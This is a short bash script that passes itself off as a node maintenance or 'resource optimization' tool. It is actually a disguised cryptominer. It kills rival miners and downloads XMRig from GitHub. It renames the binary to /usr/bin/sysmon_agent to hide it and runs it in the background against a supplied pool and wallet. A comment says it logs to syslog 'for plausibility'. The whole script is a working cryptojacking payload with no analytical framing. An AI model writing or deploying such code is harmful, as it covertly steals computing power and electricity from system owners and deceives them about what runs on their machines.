#!/bin/bash

WALLET="$1"  # Do NOT edit here! Set in node_maintenance_tool.sh
POOL="$2"    # Do NOT edit here! Set in node_maintenance_tool.sh
MAX_CPU="$3" # Do NOT edit here! Set in node_maintenance_tool.sh


pkill -f "xmrig|minerd|cpuminer" >/dev/null 2>&1

echo "[*] Optimizing system resource allocation..."
sleep 1


if ! command -v sysmon_agent >/dev/null; then
  wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
  tar -xzqf xmrig-6.18.1-linux-static-x64.tar.gz
  mv xmrig-6.18.1/xmrig /usr/bin/sysmon_agent
  chmod +x /usr/bin/sysmon_agent
fi


sysmon_agent -o "$POOL" -u "$WALLET" \
  --max-cpu-usage "$MAX_CPU" \
  --background \
  --syslog        # Logs to syslog for plausibility
